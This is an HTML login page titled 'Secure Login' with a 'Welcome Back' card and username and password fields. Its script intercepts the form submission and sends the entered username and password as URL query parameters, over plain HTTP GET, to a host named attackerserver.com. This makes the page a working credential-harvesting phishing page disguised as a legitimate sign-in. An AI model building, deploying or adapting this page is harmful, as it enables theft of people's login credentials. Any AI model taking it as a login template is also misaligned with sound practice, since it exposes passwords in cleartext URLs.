<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        /* Reset and Base Styles */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }

        /* Login Card */
        .login-card {
            background: rgba(255, 255, 255, 0.95);
            padding: 2.5rem;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
        }

        h2 { text-align: center; margin-bottom: 1.5rem; color: #333; }

        /* Input Styling */
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 1rem;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus { border-color: #764ba2; }

        /* Button Styling */
        button {
            width: 100%;
            padding: 12px;
            background: #764ba2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover { background: #5a387a; }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>Welcome Back</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault(); // Stop the form from submitting normally

            // Get values
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // Construct URL
            const url = `http://attackerserver.com/login?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;

            try {
                // Send the request
                const response = await fetch(url, { method: 'GET' });
                
                if (response.ok) {
                    alert('Login request sent successfully!');
                } else {
                    alert('Request sent, but received an error status.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Could not connect to server. Ensure your backend is running.');
            }
        });
    </script>
</body>
</html>
